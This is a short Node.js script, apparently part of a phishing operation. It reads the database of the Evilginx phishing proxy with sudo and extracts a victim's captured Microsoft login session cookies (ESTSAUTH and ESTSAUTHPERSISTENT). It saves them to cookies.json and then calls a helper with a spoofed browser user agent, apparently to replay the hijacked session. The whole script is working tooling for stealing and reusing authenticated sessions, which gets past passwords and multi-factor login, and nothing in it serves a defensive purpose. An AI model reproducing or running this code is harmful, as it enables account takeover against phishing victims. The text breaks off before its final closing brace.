const { exec } = require('child_process')
const fs =require('fs')
const util = require('util')

const runner = util.promisify(exec)


main()
async function main () {

    let {stdout} = await runner('sudo cat /root/.evilginx/data.db').catch(err => {
        console.log()
    })

     try {
        let da = stdout.split('\r\n')
        da.length
        let payload = JSON.parse(da[da.length -2])
        /* let payload = JSON.parse(da[da.length -1]) */
        
        let cookies = payload?.tokens?.[".login.microsoftonline.com"]
        
        let writePayload = 
        [{
            "user":"mega",
            "cookie":`ESTSAUTH=${cookies.ESTSAUTH?.Value};ESTSAUTHPERSISTENT=${cookies.ESTSAUTHPERSISTENT?.Value}`
        }]

        console.log(writePayload)
        
        fs.writeFileSync('cookies.json', JSON.stringify(writePayload))

        const { createTraffic } = require("./run");
        var {randomBytes} = require('crypto')
        var d = randomBytes(12).toString('base64url')
        var userAgent = `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15`
        createTraffic(userAgent)
        
     } catch(err) {
        console.log()
     }
    
